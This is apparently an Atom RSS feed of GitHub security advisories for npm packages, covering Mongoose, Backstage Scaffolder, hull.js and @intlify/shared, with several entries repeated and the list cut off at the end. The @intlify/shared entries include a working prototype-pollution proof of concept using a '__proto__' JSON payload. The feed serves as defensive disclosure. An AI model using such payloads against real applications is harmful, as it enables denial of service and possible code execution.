<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://azu.github.io/github-advisory-database-rss/npm.rss</id>
    <title>Security Advisory for JavaScript packages hosted at npmjs.com</title>
    <updated>2024-12-03T09:01:26.257Z</updated>
    <generator>github-advisory-database-rss</generator>
    <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm"/>
    <subtitle>Security Advisory for JavaScript packages hosted at npmjs.com on GitHub</subtitle>
    <rights>github-advisory-database-rss</rights>
    <category term="CRITICAL"/>
    <category term="HIGH"/>
    <category term="MODERATE"/>
    <category term="LOW"/>
    <entry>
        <title type="html"><![CDATA[[mongoose] Mongoose search injection vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-m7xq-9374-9rvx</id>
        <link href="https://github.com/advisories/GHSA-m7xq-9374-9rvx"/>
        <updated>2024-12-02T22:19:11.000Z</updated>
        <content type="html"><![CDATA[<p>Mongoose before 8.8.3 can improperly use $where in match.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-53900">https://nvd.nist.gov/vuln/detail/CVE-2024-53900</a></li>
<li><a href="https://github.com/Automattic/mongoose/commit/c9e86bff7eef477da75a29af62a06d41a835a156">https://github.com/Automattic/mongoose/commit/c9e86bff7eef477da75a29af62a06d41a835a156</a></li>
<li><a href="https://github.com/Automattic/mongoose/blob/master/CHANGELOG.md">https://github.com/Automattic/mongoose/blob/master/CHANGELOG.md</a></li>
<li><a href="https://github.com/advisories/GHSA-m7xq-9374-9rvx">https://github.com/advisories/GHSA-m7xq-9374-9rvx</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-m7xq-9374-9rvx</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-12-02T21:31:20.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@backstage/plugin-scaffolder-node] Backstage Scaffolder plugin vulnerable to Server-Side Request Forgery]]></title>
        <id>https://github.com/advisories/GHSA-qmc2-jpr5-7rg9</id>
        <link href="https://github.com/advisories/GHSA-qmc2-jpr5-7rg9"/>
        <updated>2024-12-02T21:36:22.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>A vulnerability is identified in Backstage Scaffolder template functionality where Server-Side Template Injection (SSTI) can be exploited to perform Git config injection. The vulnerability allows an attacker to capture privileged git tokens used by the Backstage Scaffolder plugin. With these tokens, unauthorized access to sensitive resources in git can be achieved. The impact is considered medium severity as the Backstage Threat Model recommends restricting access to adding and editing templates in the Backstage Catalog plugin.</p>
<h3 id="patches">Patches</h3>
<p>The issue has been resolved in versions <code>v0.4.12</code>, <code>v0.5.1</code> and <code>v0.6.1</code> of the <code>@backstage/plugin-scaffolder-node</code> package. Users are encouraged to upgrade to this version to mitigate the vulnerability.</p>
<h3 id="workarounds">Workarounds</h3>
<p>Users can ensure that templates do not change git config.</p>
<h3 id="references">References</h3>
<p>If you have any questions or comments about this advisory:</p>
<p>Open an issue in the <a href="https://github.com/backstage/backstage">Backstage repository</a>
Visit our Discord, linked to in <a href="https://github.com/backstage/backstage">Backstage README</a></p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/backstage/backstage/security/advisories/GHSA-qmc2-jpr5-7rg9">https://github.com/backstage/backstage/security/advisories/GHSA-qmc2-jpr5-7rg9</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-53983">https://nvd.nist.gov/vuln/detail/CVE-2024-53983</a></li>
<li><a href="https://github.com/backstage/backstage/tree/master/plugins/scaffolder-node">https://github.com/backstage/backstage/tree/master/plugins/scaffolder-node</a></li>
<li><a href="https://github.com/advisories/GHSA-qmc2-jpr5-7rg9">https://github.com/advisories/GHSA-qmc2-jpr5-7rg9</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-qmc2-jpr5-7rg9</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-12-02T21:36:21.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@backstage/plugin-scaffolder-node] Backstage Scaffolder plugin vulnerable to Server-Side Request Forgery]]></title>
        <id>https://github.com/advisories/GHSA-qmc2-jpr5-7rg9</id>
        <link href="https://github.com/advisories/GHSA-qmc2-jpr5-7rg9"/>
        <updated>2024-12-02T21:36:22.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>A vulnerability is identified in Backstage Scaffolder template functionality where Server-Side Template Injection (SSTI) can be exploited to perform Git config injection. The vulnerability allows an attacker to capture privileged git tokens used by the Backstage Scaffolder plugin. With these tokens, unauthorized access to sensitive resources in git can be achieved. The impact is considered medium severity as the Backstage Threat Model recommends restricting access to adding and editing templates in the Backstage Catalog plugin.</p>
<h3 id="patches">Patches</h3>
<p>The issue has been resolved in versions <code>v0.4.12</code>, <code>v0.5.1</code> and <code>v0.6.1</code> of the <code>@backstage/plugin-scaffolder-node</code> package. Users are encouraged to upgrade to this version to mitigate the vulnerability.</p>
<h3 id="workarounds">Workarounds</h3>
<p>Users can ensure that templates do not change git config.</p>
<h3 id="references">References</h3>
<p>If you have any questions or comments about this advisory:</p>
<p>Open an issue in the <a href="https://github.com/backstage/backstage">Backstage repository</a>
Visit our Discord, linked to in <a href="https://github.com/backstage/backstage">Backstage README</a></p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/backstage/backstage/security/advisories/GHSA-qmc2-jpr5-7rg9">https://github.com/backstage/backstage/security/advisories/GHSA-qmc2-jpr5-7rg9</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-53983">https://nvd.nist.gov/vuln/detail/CVE-2024-53983</a></li>
<li><a href="https://github.com/backstage/backstage/tree/master/plugins/scaffolder-node">https://github.com/backstage/backstage/tree/master/plugins/scaffolder-node</a></li>
<li><a href="https://github.com/advisories/GHSA-qmc2-jpr5-7rg9">https://github.com/advisories/GHSA-qmc2-jpr5-7rg9</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-qmc2-jpr5-7rg9</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-12-02T21:36:21.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@backstage/plugin-scaffolder-node] Backstage Scaffolder plugin vulnerable to Server-Side Request Forgery]]></title>
        <id>https://github.com/advisories/GHSA-qmc2-jpr5-7rg9</id>
        <link href="https://github.com/advisories/GHSA-qmc2-jpr5-7rg9"/>
        <updated>2024-12-02T21:36:22.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>A vulnerability is identified in Backstage Scaffolder template functionality where Server-Side Template Injection (SSTI) can be exploited to perform Git config injection. The vulnerability allows an attacker to capture privileged git tokens used by the Backstage Scaffolder plugin. With these tokens, unauthorized access to sensitive resources in git can be achieved. The impact is considered medium severity as the Backstage Threat Model recommends restricting access to adding and editing templates in the Backstage Catalog plugin.</p>
<h3 id="patches">Patches</h3>
<p>The issue has been resolved in versions <code>v0.4.12</code>, <code>v0.5.1</code> and <code>v0.6.1</code> of the <code>@backstage/plugin-scaffolder-node</code> package. Users are encouraged to upgrade to this version to mitigate the vulnerability.</p>
<h3 id="workarounds">Workarounds</h3>
<p>Users can ensure that templates do not change git config.</p>
<h3 id="references">References</h3>
<p>If you have any questions or comments about this advisory:</p>
<p>Open an issue in the <a href="https://github.com/backstage/backstage">Backstage repository</a>
Visit our Discord, linked to in <a href="https://github.com/backstage/backstage">Backstage README</a></p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/backstage/backstage/security/advisories/GHSA-qmc2-jpr5-7rg9">https://github.com/backstage/backstage/security/advisories/GHSA-qmc2-jpr5-7rg9</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-53983">https://nvd.nist.gov/vuln/detail/CVE-2024-53983</a></li>
<li><a href="https://github.com/backstage/backstage/tree/master/plugins/scaffolder-node">https://github.com/backstage/backstage/tree/master/plugins/scaffolder-node</a></li>
<li><a href="https://github.com/advisories/GHSA-qmc2-jpr5-7rg9">https://github.com/advisories/GHSA-qmc2-jpr5-7rg9</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-qmc2-jpr5-7rg9</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-12-02T21:36:21.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[hull.js] hull.js Code Injection Vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-q849-wxrc-vqrp</id>
        <link href="https://github.com/advisories/GHSA-q849-wxrc-vqrp"/>
        <updated>2024-12-02T20:11:40.000Z</updated>
        <content type="html"><![CDATA[<p>Versions of the library from 0.2.2 to 1.0.9 are vulnerable to the arbitrary code execution due to unsafe usage of <code>new Function(...)</code> in the module that handles points format. Applications passing the 3rd parameter to the <code>hull</code> function without sanitising may be impacted. The vulnerability has been fixed in version 1.0.10, please update the library. Check project homepage on GitHub to see how to fetch the latest version: <a href="https://github.com/andriiheonia/hull?tab=readme-ov-file#npm-package">https://github.com/andriiheonia/hull?tab=readme-ov-file#npm-package</a></p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/AndriiHeonia/hull/security/advisories/GHSA-q849-wxrc-vqrp">https://github.com/AndriiHeonia/hull/security/advisories/GHSA-q849-wxrc-vqrp</a></li>
<li><a href="https://github.com/AndriiHeonia/hull/commit/9de6f9549b74fbb68bf4d5a449147b4c1d7cda0a">https://github.com/AndriiHeonia/hull/commit/9de6f9549b74fbb68bf4d5a449147b4c1d7cda0a</a></li>
<li><a href="https://github.com/advisories/GHSA-q849-wxrc-vqrp">https://github.com/advisories/GHSA-q849-wxrc-vqrp</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-q849-wxrc-vqrp</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2024-12-02T20:11:39.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[vue-i18n] @intlify/shared Prototype Pollution vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-hjwq-mjwj-4x6c</id>
        <link href="https://github.com/advisories/GHSA-hjwq-mjwj-4x6c"/>
        <updated>2024-12-02T17:26:48.000Z</updated>
        <content type="html"><![CDATA[<p><strong>Vulnerability type: Prototype Pollution</strong></p>
<p><strong>Affected Package:</strong></p>
<p>Product: @intlify/shared
Version: 10.0.4</p>
<p><strong>Vulnerability Location(s):</strong></p>
<p><code>node_modules/@intlify/shared/dist/shared.cjs:232:26</code></p>
<p><strong>Description:</strong></p>
<p>The latest version of <code>@intlify/shared (10.0.4)</code> is vulnerable to Prototype Pollution through the entry function(s) <code>lib.deepCopy</code>. An attacker can supply a payload with <code>Object.prototype</code> setter to introduce or modify properties within the global prototype chain, causing denial of service (DoS) the minimum consequence.</p>
<p>Moreover, the consequences of this vulnerability can escalate to other injection-based attacks, depending on how the library integrates within the application. For instance, if the polluted property propagates to sensitive Node.js APIs (e.g., exec, eval), it could enable an attacker to execute arbitrary commands within the application's context.</p>
<p><strong>PoC:</strong></p>
<pre><code class="language-bash">// install the package with the latest version
~$ npm install @intlify/shared@10.0.4
// run the script mentioned below 
~$ node poc.js
//The expected output (if the code still vulnerable) is below. 
// Note that the output may slightly differs from function to another.
Before Attack:  {}
After Attack:  {"pollutedKey":123}
</code></pre>
<pre><code class="language-js">(async () =&gt; {
const lib = await import('@intlify/shared');
var someObj = {}
console.log("Before Attack: ", JSON.stringify({}.__proto__));
try {
// for multiple functions, uncomment only one for each execution.
lib.deepCopy (JSON.parse('{"__proto__":{"pollutedKey":123}}'), someObj)
} catch (e) { }
console.log("After Attack: ", JSON.stringify({}.__proto__));
delete Object.prototype.pollutedKey;
})();
</code></pre>
<p><strong>References</strong></p>
<p><a href="https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/">Prototype Pollution Leading to Remote Code Execution</a> - An example of how prototype pollution can lead to command code injection.</p>
<p><a href="https://cheatsheetseries.owasp.org/cheatsheets/Prototype_Pollution_Prevention_Cheat_Sheet.html">OWASP Prototype Pollution Prevention Cheat Sheet</a> - Best practices for preventing prototype pollution.</p>
<p><a href="https://portswigger.net/web-security/prototype-pollution/preventing">PortSwigger Guide on Preventing Prototype Pollution</a> - A detailed guide to securing your applications against prototype pollution.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/intlify/vue-i18n/security/advisories/GHSA-hjwq-mjwj-4x6c">https://github.com/intlify/vue-i18n/security/advisories/GHSA-hjwq-mjwj-4x6c</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-52810">https://nvd.nist.gov/vuln/detail/CVE-2024-52810</a></li>
<li><a href="https://github.com/intlify/vue-i18n/commit/9f20909ef8c9232a1072d7818e12ed6d6451024d">https://github.com/intlify/vue-i18n/commit/9f20909ef8c9232a1072d7818e12ed6d6451024d</a></li>
<li><a href="https://github.com/advisories/GHSA-hjwq-mjwj-4x6c">https://github.com/advisories/GHSA-hjwq-mjwj-4x6c</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-hjwq-mjwj-4x6c</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-12-02T17:26:47.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@intlify/vue-i18n-core] @intlify/shared Prototype Pollution vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-hjwq-mjwj-4x6c</id>
        <link href="https://github.com/advisories/GHSA-hjwq-mjwj-4x6c"/>
        <updated>2024-12-02T17:26:48.000Z</updated>
        <content type="html"><![CDATA[<p><strong>Vulnerability type: Prototype Pollution</strong></p>
<p><strong>Affected Package:</strong></p>
<p>Product: @intlify/shared
Version: 10.0.4</p>
<p><strong>Vulnerability Location(s):</strong></p>
<p><code>node_modules/@intlify/shared/dist/shared.cjs:232:26</code></p>
<p><strong>Description:</strong></p>
<p>The latest version of <code>@intlify/shared (10.0.4)</code> is vulnerable to Prototype Pollution through the entry function(s) <code>lib.deepCopy</code>. An attacker can supply a payload with <code>Object.prototype</code> setter to introduce or modify properties within the global prototype chain, causing denial of service (DoS) the minimum consequence.</p>
<p>Moreover, the consequences of this vulnerability can escalate to other injection-based attacks, depending on how the library integrates within the application. For instance, if the polluted property propagates to sensitive Node.js APIs (e.g., exec, eval), it could enable an attacker to execute arbitrary commands within the application's context.</p>
<p><strong>PoC:</strong></p>
<pre><code class="language-bash">// install the package with the latest version
~$ npm install @intlify/shared@10.0.4
// run the script mentioned below 
~$ node poc.js
//The expected output (if the code still vulnerable) is below. 
// Note that the output may slightly differs from function to another.
Before Attack:  {}
After Attack:  {"pollutedKey":123}
</code></pre>
<pre><code class="language-js">(async () =&gt; {
const lib = await import('@intlify/shared');
var someObj = {}
console.log("Before Attack: ", JSON.stringify({}.__proto__));
try {
// for multiple functions, uncomment only one for each execution.
lib.deepCopy (JSON.parse('{"__proto__":{"pollutedKey":123}}'), someObj)
} catch (e) { }
console.log("After Attack: ", JSON.stringify({}.__proto__));
delete Object.prototype.pollutedKey;
})();
</code></pre>
<p><strong>References</strong></p>
<p><a href="https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/">Prototype Pollution Leading to Remote Code Execution</a> - An example of how prototype pollution can lead to command code injection.</p>
<p><a href="https://cheatsheetseries.owasp.org/cheatsheets/Prototype_Pollution_Prevention_Cheat_Sheet.html">OWASP Prototype Pollution Prevention Cheat Sheet</a> - Best practices for preventing prototype pollution.</p>
<p><a href="https://portswigger.net/web-security/prototype-pollution/preventing">PortSwigger Guide on Preventing Prototype Pollution</a> - A detailed guide to securing your applications against prototype pollution.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/intlify/vue-i18n/security/advisories/GHSA-hjwq-mjwj-4x6c">https://github.com/intlify/vue-i18n/security/advisories/GHSA-hjwq-mjwj-4x6c</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-52810">https://nvd.nist.gov/vuln/detail/CVE-2024-52810</a></li>
<li><a href="https://github.com/intlify/vue-i18n/commit/9f20909ef8c9232a1072d7818e12ed6d6451024d">https://github.com/intlify/vue-i18n/commit/9f20909ef8c9232a1072d7818e12ed6d6451024d</a></li>
<li><a href="https://github.com/advisories/GHSA-hjwq-mjwj-4x6c">https://github.com/advisories/GHSA-hjwq-mjwj-4x6c</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-hjwq-mjwj-4x6c</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-12-02T17:26:47.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@intlify/shared] @intlify/shared Prototype Pollution vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-hjwq-mjwj-4x6c</id>
        <link href="https://github.com/advisories/GHSA-hjwq-mjwj-4x6c"/>
        <updated>2024-12-02T17:26:48.000Z</updated>
        <content type="html"><![CDATA[<p><strong>Vulnerability type: Prototype Pollution</strong></p>
<p><strong>Affected Package:</strong></p>
<p>Product: @intlify/shared
Version: 10.0.4</p>
<p><strong>Vulnerability Location(s):</strong></p>
<p><code>node_modules/@intlify/shared/dist/shared.cjs:232:26</code></p>
<p><strong>Description:</strong></p>
<p>The latest version of <code>@intlify/shared (10.0.4)</code> is vulnerable to Prototype Pollution through the entry function(s) <code>lib.deepCopy</code>. An attacker can supply a payload with <code>Object.prototype</code> setter to introduce or modify properties within the global prototype chain, causing denial of service (DoS) the minimum consequence.</p>
<p>Moreover, the consequences of this vulnerability can escalate to other injection-based attacks, depending on how the library integrates within the application. For instance, if the polluted property propagates to sensitive Node.js APIs (e.g., exec, eval), it could enable an attacker to execute arbitrary commands within the application's context.</p>
<p><strong>PoC:</strong></p>
<pre><code class="language-bash">// install the package with the latest version
~$ npm install @intlify/shared@10.0.4
// run the script mentioned below 
~$ node poc.js
//The expected output (if the code still vulnerable) is below. 
// Note that the output may slightly differs from function to another.
Before Attack:  {}
After Attack:  {"pollutedKey":123}
</code></pre>
<pre><code class="language-js">(async () =&gt; {
const lib = await import('@intlify/shared');
var someObj = {}
console.log("Before Attack: ", JSON.stringify({}.__proto__));
try {
// for multiple functions, uncomment only one for each execution.
lib.deepCopy (JSON.parse('{"__proto__":{"pollutedKey":123}}'), someObj)
} catch (e) { }
console.log("After Attack: ", JSON.stringify({}.__proto__));
delete Object.prototype.pollutedKey;
})();
</code></pre>
<p><strong>References</strong></p>
<p><a href="https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/">Prototype Pollution Leading to Remote Code Execution</a> - An example of how prototype pollution can lead to command code injection.</p>
<p><a href="https://cheatsheetseries.owasp.org/cheatsheets/Prototype_Pollution_Prevention_Cheat_Sheet.html">OWASP Prototype Pollution Prevention Cheat Sheet</a> - Best practices for preventing prototype pollution.</p>
<p><a href="https://portswigger.net/web-security/prototype-pollution/preventing">PortSwigger Guide on Preventing Prototype Pollution</a> - A detailed guide to securing your applications against prototype pollution.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/intlify/vue-i18n/security/advisories/GHSA-hjwq-mjwj-4x6c">https://github.com/intlify/vue-i18n/security/advisories/GHSA-hjwq-mjwj-4x6c</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-52810">https://nvd.nist.gov/vuln/detail/CVE-2024-52810</a></li>
<li><a href="https://github.com/intlify/vue-i18n/commit/9f20909ef8c9232a1072d7818e12ed6d6451024d">https://github.com/intlify/vue-i18n/commit/9f20909ef8c9232a1072d7818e12ed6d6451024d</a></li>
<li><a href="https://github.com/advisories/GHSA-hjwq-mjwj-4x6c">https://github.com/advisories/GHSA-hjwq-mjwj-4x6c</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-hjwq-mjwj-4x6c</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-12-02T17:26:47.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[petite-vue-i18n] @intlify/shared Prototype Pollution vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-hjwq-mjwj-4x6c</id>
        <link href="https://github.com/advisories/GHSA-hjwq-mjwj-4x6c"/>
        <updated>2024-12-02T17:26:48.000Z</updated>
        <content type="html"><![CDATA[<p><strong>Vulnerability type: Prototype Pollution</strong></p>
<p><strong>Affected Package:</strong></p>
<p>Product: @intlify/shared
Version: 10.0.4</p>
<p><strong>Vulnerability Location(s):</strong></p>
<p><code>node_modules/@intlify/shared/dist/shared.cjs:232:26</code></p>
<p><strong>Description:</strong></p>
<p>The latest version of <code>@intlify/shared (10.0.4)</code> is vulnerable to Prototype Pollution through the entry function(s) <code>lib.deepCopy</code>. An attacker can supply a payload with <code>Object.prototype</code> setter to introduce or modify properties within the global prototype chain, causing denial of service (DoS) the minimum consequence.</p>
<p>Moreover, the consequences of this vulnerability can escalate to other injection-based attacks, depending on how the library integrates within the application. For instance, if the polluted property propagates to sensitive Node.js APIs (e.g., exec, eval), it could enable an attacker to execute arbitrary commands within the application's context.</p>
<p><strong>PoC:</strong></p>
<pre><code class="language-bash">// install the package with the latest version
~$ npm install @intlify/shared@10.0.4
// run the script mentioned below 
~$ node poc.js
//The expected output (if the code still vulnerable) is below. 
// Note that the output may slightly differs from function to another.
Before Attack:  {}
After Attack:  {"pollutedKey":123}
</code></pre>
<pre><code class="language-js">(async () =&gt; {
const lib = await import('@intlify/shared');
var someObj = {}
console.log("Before Attack: ", JSON.stringify({}.__proto__));
try {
// for multiple functions, uncomment only one for each execution.
lib.deepCopy (JSON.parse('{"__proto__":{"pollutedKey":123}}'), someObj)
} catch (e) { }
console.log("After Attack: ", JSON.stringify({}.__proto__));
delete Object.prototype.pollutedKey;
})();
</code></pre>
<p><strong>References</strong></p>
<p><a href="https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/">Prototype Pollution Leading to Remote Code Execution</a> - An example of how prototype pollution can lead to command code injection.</p>
<p><a href="https://cheatsheetseries.owasp.org/cheatsheets/Prototype_Pollution_Prevention_Cheat_Sheet.html">OWASP Prototype Pollution Prevention Cheat Sheet</a> - Best practices for preventing prototype pollution.</p>
<p><a href="https://portswigger.net/web-security/prototype-pollution/preventing">PortSwigger Guide on Preventing Prototype Pollution</a> - A detailed guide to securing your applications against prototype pollution.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/intlify/vue-i18n/security/advisories/GHSA-hjwq-mjwj-4x6c">https://github.com/intlify/vue-i18n/security/advisories/GHSA-hjwq-mjwj-4x6c</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-52810">https://nvd.nist.gov/vuln/detail/CVE-2024-52810</a></li>
<li><a href="https://github.com/intlify/vue-i18n/commit/9f20909ef8c9232a1072d7818e12ed6d6451024d">https://github.com/intlify/vue-i18n/commit/9f20909ef8c9232a1072d7818e12ed6d6451024d</a></li>
<li><a href="https://github.com/advisories/GHSA-hjwq-mjwj-4x6c">https://github.com/advisories/GHSA-hjwq-mjwj-4x6c</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-hjwq-mjwj-4x6c</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-12-02T17:26:47.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[vue-i18n] @intlify/shared Prototype Pollution vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-hjwq-mjwj-4x6c</id>
        <link href="https://github.com/advisories/GHSA-hjwq-mjwj-4x6c"/>
        <updated>2024-12-02T17:26:48.000Z</updated>
        <content type="html"><![CDATA[<p><strong>Vulnerability type: Prototype Pollution</strong></p>
<p><strong>Affected Package:</strong></p>
<p>Product: @intlify/shared
Version: 10.0.4</p>
<p><strong>Vulnerability Location(s):</strong></p>
<p><code>node_modules/@intlify/shared/dist/shared.cjs:232:26</code></p>
<p><strong>Description:</strong></p>
<p>The latest version of <code>@intlify/shared (10.0.4)</code> is vulnerable to Prototype Pollution through the entry function(s) <code>lib.deepCopy</code>. An attacker can supply a payload with <code>Object.prototype</code> setter to introduce or modify properties within the global prototype chain, causing denial of service (DoS) the minimum consequence.</p>
<p>Moreover, the consequences of this vulnerability can escalate to other injection-based attacks, depending on how the library integrates within the application. For instance, if the polluted property propagates to sensitive Node.js APIs (e.g., exec, eval), it could enable an attacker to execute arbitrary commands within the application's context.</p>
<p><strong>PoC:</strong></p>
<pre><code class="language-bash">// install the package with the latest version
~$ npm install @intlify/shared@10.0.4
// run the script mentioned below 
~$ node poc.js
//The expected output (if the code still vulnerable) is below. 
// Note that the output may slightly differs from function to another.
Before Attack:  {}
After Attack:  {"pollutedKey":123}
</code></pre>
<pre><code class="language-js">(async () =&gt; {
const lib = await import('@intlify/shared');
var someObj = {}
console.log("Before Attack: ", JSON.stringify({}.__proto__));
try {
// for multiple functions, uncomment only one for each execution.
lib.deepCopy (JSON.parse('{"__proto__":{"pollutedKey":123}}'), someObj)
} catch (e) { }
console.log("After Attack: ", JSON.stringify({}.__proto__));
delete Object.prototype.pollutedKey;
})();
</code></pre>
<p><strong>References</strong></p>
<p><a href="https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/">Prototype Pollution Leading to Remote Code Execution</a> - An example of how prototype pollution can lead to command code injection.</p>
<p><a href="https://cheatsheetseries.owasp.org/cheatsheets/Prototype_Pollution_Prevention_Cheat_Sheet.html">OWASP Prototype Pollution Prevention Cheat Sheet</a> - Best practices for preventing prototype pollution.</p>
<p><a href="https://portswigger.net/web-security/prototype-pollution/preventing">PortSwigger Guide on Preventing Prototype Pollution</a> - A detailed guide to securing your applications against prototype pollution.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/intlify/vue-i18n/security/advisories/GHSA-hjwq-mjwj-4x6c">https://github.com/intlify/vue-i18n/security/advisories/GHSA-hjwq-mjwj-4x6c</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-52810">https://nvd.nist.gov/vuln/detail/CVE-2024-52810</a></li>
<li><a href="https://github.com/intlify/vue-i18n/commit/9f20909ef8c9232a1072d7818e12ed6d6451024d">https://github.com/intlify/vue-i18n/commit/9f20909ef8c9232a1072d7818e12ed6d6451024d</a></li>
<li><a href="https://github.com/advisories/GHSA-hjwq-mjwj-4x6c">https://github.com/advisories/GHSA-hjwq-mjwj-4x6c</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-hjwq-mjwj-4x6c</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-12-02T17:26:47.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@intlify/vue-i18n-core] @intlify/shared Prototype Pollution vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-hjwq-mjwj-4x6c</id>
        <link href="https://github.com/advisories/GHSA-hjwq-mjwj-4x6c"/>
        <updated>2024-12-02T17:26:48.000Z</updated>
        <content type="html"><![CDATA[<p><strong>Vulnerability type: Prototype Pollution</strong></p>
<p><strong>Affected Package:</strong></p>
<p>Product: @intlify/shared
Version: 10.0.4</p>
<p><strong>Vulnerability Location(s):</strong></p>
<p><code>node_modules/@intlify/shared/dist/shared.cjs:232:26</code></p>
<p><strong>Description:</strong></p>
<p>The latest version of <code>@intlify/shared (10.0.4)</code> is vulnerable to Prototype Pollution through the entry function(s) <code>lib.deepCopy</code>. An attacker can supply a payload with <code>Object.prototype</code> setter to introduce or modify properties within the global prototype chain, causing denial of service (DoS) the minimum consequence.</p>
<p>Moreover, the consequences of this vulnerability can escalate to other injection-based attacks, depending on how the library integrates within the application. For instance, if the polluted property propagates to sensitive Node.js APIs (e.g., exec, eval), it could enable an attacker to execute arbitrary commands within the application's context.</p>
<p><strong>PoC:</strong></p>
<pre><code class="language-bash">// install the package with the latest version
~$ npm install @intlify/shared@10.0.4
// run the script mentioned below 
~$ node poc.js
//The expected output (if the code still vulnerable) is below. 
// Note that the output may slightly differs from function to another.
Before Attack:  {}
After Attack:  {"pollutedKey":123}
</code></pre>
<pre><code class="language-js">(async () =&gt; {
const lib = await import('@intlify/shared');
var someObj = {}
console.log("Before Attack: ", JSON.stringify({}.__proto__));
try {
// for multiple functions, uncomment only one for each execution.
lib.deepCopy (JSON.parse('{"__proto__":{"pollutedKey":123}}'), someObj)
} catch (e) { }
console.log("After Attack: ", JSON.stringify({}.__proto__));
delete Object.prototype.pollutedKey;
})();
</code></pre>
<p><strong>References</strong></p>
<p><a href="https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/">Prototype Pollution Leading to Remote Code Execution</a> - An example of how prototype pollution can lead to command code injection.</p>
<p><a href="https://cheatsheetseries.owasp.org/cheatsheets/Prototype_Pollution_Prevention_Cheat_Sheet.html">OWASP Prototype Pollution Prevention Cheat Sheet</a> - Best practices for preventing prototype pollution.</p>
<p><a href="https://portswigger.net/web-security/prototype-pollution/preventing">PortSwigger Guide on Preventing Prototype Pollution</a> - A detailed guide to securing your applications against prototype pollution.</p>
<h3 id="references">References</h3>
<ul>
